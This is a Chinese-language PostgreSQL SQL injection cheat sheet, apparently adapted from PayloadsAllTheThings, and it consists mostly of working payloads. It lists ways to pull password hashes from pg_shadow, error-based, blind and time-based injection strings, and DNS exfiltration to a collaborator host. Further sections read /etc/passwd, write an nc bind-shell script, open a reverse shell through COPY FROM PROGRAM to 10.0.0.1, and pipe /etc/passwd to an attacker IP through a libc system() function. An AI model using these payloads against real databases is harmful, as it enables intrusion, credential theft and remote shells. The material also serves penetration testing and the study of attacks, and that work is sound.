# PostgreSQL Injection - PostgreSQL注入攻击

[SEARCH_KEYWORDS]
漏洞类型: SQL Injection PostgreSQL 数据库注入
攻击类型: Data Extraction Command Execution File Read/Write
关键词: PostgreSQL pg_sleep COPY lo_import UNION error-based blind
技术: CAST pg_read_file COPY PROGRAM libc.so RCE Stacked Query
工具: sqlmap pg_ls_dir pg_read_file lo_export COPY TO FROM
函数: version() current_database() current_user pg_sleep

[CONTENT]

## PostgreSQL注入概述

PostgreSQL注入是一种安全漏洞，攻击者利用未正确清理的用户输入在PostgreSQL数据库中执行未授权SQL命令。

## PostgreSQL注释

| 类型 | 示例 |
|------|------|
| 单行注释 | `--` |
| 多行注释 | `/**/` |

## 信息枚举

```sql
SELECT version()                    -- DBMS版本
SELECT CURRENT_DATABASE()           -- 数据库名
SELECT CURRENT_SCHEMA()             -- 数据库架构
SELECT usename FROM pg_user         -- 列出用户
SELECT usename, passwd FROM pg_shadow -- 密码哈希
SELECT user;                        -- 当前用户
SELECT session_user;                -- 会话用户
```

### 列Schema和表

```sql
SELECT DISTINCT(schemaname) FROM pg_tables
SELECT datname FROM pg_database
SELECT table_name FROM information_schema.tables
SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```

## Error Based注入

```sql
AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- -
AND CAST((SELECT version()) AS INT)=1337 -- -
```

```sql
CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
```

## XML Helpers

```sql
SELECT query_to_xml('select * from pg_user',true,true,'');
SELECT database_to_xml(true,true,'');
```

## Blind Based注入

```sql
' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
```

## Time Based注入

```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## Out of Band数据外带

```sql
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

## Stacked Query

```sql
SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
```

## 文件操作

### 读取文件

```sql
-- pg_read_file
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);

-- COPY
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;

-- lo_import
SELECT lo_import('/etc/passwd');
SELECT lo_get(16420);
SELECT * from pg_largeobject;
```

### 写入文件

```sql
-- COPY
CREATE TABLE nc (t TEXT);
INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
COPY nc(t) TO '/tmp/nc.sh';

-- 一行写入
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';

-- lo_export
SELECT lo_from_bytea(43210, 'your file data');
SELECT lo_put(43210, 20, 'some other data');
SELECT lo_export(43210, '/tmp/testexport');
```

## 命令执行

### COPY TO/FROM PROGRAM

PostgreSQL 9.3+，需要superuser或`pg_execute_server_program`权限：

```sql
COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'

CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
```

### libc.so.6

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

## WAF绕过

### 替代引号

```sql
SELECT CHR(65)||CHR(66)||CHR(67);     -- 从CHR()构造字符串
SELECT $TAG$This                       -- 美元符号(PostgreSQL 8+)
```

## 权限检查

```sql
SHOW is_superuser;
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user;
```

## 参考文档

原始来源: PayloadsAllTheThings/SQL Injection/PostgreSQL Injection.md